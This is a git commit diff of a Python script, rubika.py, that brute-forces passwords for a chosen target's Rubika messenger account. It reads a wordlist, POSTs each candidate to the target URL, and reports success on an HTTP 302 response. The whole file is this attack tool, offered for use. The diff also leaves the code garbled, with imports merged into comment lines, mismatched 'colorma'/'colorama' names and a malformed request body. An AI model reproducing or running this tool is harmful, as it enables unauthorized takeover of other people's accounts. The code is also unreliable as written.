5d1b531c47553de119ef843e030644d1aee4cc58
řyson <94848576+FILTERING-RUBIKA-RYSON@users.noreply.github.com>
2022-04-28 01:26:40 +0430

    Update rubika.py

--- rubika.py
+++ rubika.py
@@ -1,10 +1,8 @@
-#py3
-# coded by mmd
-from sys import flags
-import requests,time
+#py3                                                       # coded by mmd
+from sys import flags                                      import requests,time
 import os
 import sys
-
+import colorama, colored
 
 class colorma:
     CYAN = '\033[96m'
@@ -30,7 +28,7 @@ if ins == "n".lower():
 os.system("clear")
 time.sleep(1)
 print ()
-name = input (f"{colorama.GREEN}please enter your name ⟩⟩ ")
+name = input (f"{colorma.GREEN}please enter your name ⟩⟩ ")
 print ("\n"*10)
 time.sleep(1)
 user = input(f"""{colorma.YELLOW}
@@ -58,7 +56,7 @@ dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
                         X. 9         P )X
                          b          '  d'
 
-                         
+
 
 
 
@@ -69,12 +67,12 @@ dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
 
  [https://web.rubika.ir/#c=uxxxxxxxx]
 
- [https://web.rubika.ir/#im?um=@xxxx] 
-                     
-                    
+ [https://web.rubika.ir/#im?um=@xxxx]
 
 
-{colorama.BLUE} ⟩⟩ [{name}] ⟩⟩ {colorama.GREEN}please enter username target- type user ⟩⟩ {colorma.END}""")
+
+
+{colorma.BLUE} ⟩⟩ [{name}] ⟩⟩ {colorma.GREEN}please enter username target- type user ⟩⟩ {colorma.END}""")
 print ()
 users = user.split(".")
 try:
@@ -89,26 +87,26 @@ try:
             print(f"{colorma.RED}[X] Error 404 : Not This Link Target For Database Rubika{colorma.END}")
         elif(stats.status_code == 200):
             print(f"{colorma.GREEN}[+] Alert : Find Link Target For Database Rubika True{colorma.END}")
-            sd = input(f"{colorma.YELLOW}[?] Do you have a list Cods or should I use my list password [y/n] ⟩⟩ {colorma.END} ")
+            sd = input(f"{colorma.YELLOW}[?] password list [y/n] ⟩⟩ {colorma.END} ")
             if(sd == "y".lower()):
                 worldlist = input(f"{colorma.YELLOW}[?] Please Enter Path Codes List :>{colorma.END} ")
             elif(sd == "n".lower()):
                 worldlist = "cod.txt"
             else:
-                print(f"{colorma.RED}[X] Error Index{colorma.END}")
-                exit()    
+                print(f"{colorama.RED}[X] Error Index{colorma.END}")
+                exit()
             try:
                 shekan = True
                 wordlist = open(worldlist,"r").read().split()
-                print(f"\r{colorma.GREEN}[+] start > 5s",end="",flush=False) 
+                print(f"\r{colorma.GREEN}[+] start > 5s",end="",flush=False)
                 time.sleep(1)
-                print(f"\r{colorma.GREEN}[+] Alert >> 4s",end="",flush=False)
-                time.sleep(1) 
-                print(f"\r{colorma.GREEN}[+] Alert >>> 3s",end="",flush=False) 
+                print(f"\r{colorma.GREEN}[+] start >> 4s",end="",flush=False)
                 time.sleep(1)
-                print(f"\r{colorma.GREEN}[+] Alert >>>> 2s",end="",flush=False) 
+                print(f"\r{colorma.GREEN}[+] start >>> 3s",end="",flush=False)
                 time.sleep(1)
-                print(f"\r{colorma.GREEN}[+] Alert >>>> 1s\r") 
+                print(f"\r{colorma.GREEN}[+] start >>>> 2s",end="",flush=False)
+                time.sleep(1)
+                print(f"\r{colorma.GREEN}[+] start >>>> 1s\r")
                 time.sleep(1)
 
                 usd = users[0].split("/")
@@ -116,29 +114,29 @@ try:
 
                 while shekan:
                     for word in wordlist:
-                        Target = requests.post(f"{user}",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
+                        Target = requests.post(f"{user}",data=f"{word}{users}")
                         # _
 
                         try:
                             if(Target.status_code == 302):
-                                print(f"{colorma.GREEN}[{time.ctime()}] {user}:{80} [played] : {colorma.END}{colorma.CYAN}{word}")
+                                print(f"{colorma.GREEN}[{time.ctime()}] {user}:{80} [played] : {colorma.END}{colorma.BLUE}{word}")
                                 shekan = False
                                 break
                             else:
-                                print(f"{colorma.RED}[{time.ctime()}] {user}:{80} [yes spam] : {colorma.END}{colorma.RED}{word}")
+                                print(f"{colorma.RED}[{time.ctime()}] {user}:{80} [yes spam] : {colorma.END}{colorma.BLUE}{word}")
                         except:
                             print(f"{colorma.RED}[X] Error Net : No Internet{colorma.END}")
-                            shekan = False        
+                            shekan = False
             except:
                 print(f"{colorma.RED}[X] Error File : Not Find Path WordList{colorma.END}")
         elif(stats.status_code == "503"):
-            print(f"{colorma.RED}[X] Error Net : Please Check Internet{colorma.END}")        
+            print(f"{colorma.RED}[X] Error Net : Please Check Internet{colorma.END}")
         else:
-            print(type(stats.status_code))    
+            print(type(stats.status_code))
     else:
         print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}")
 except:
-    print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}") 
+    print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}")
 
 
 
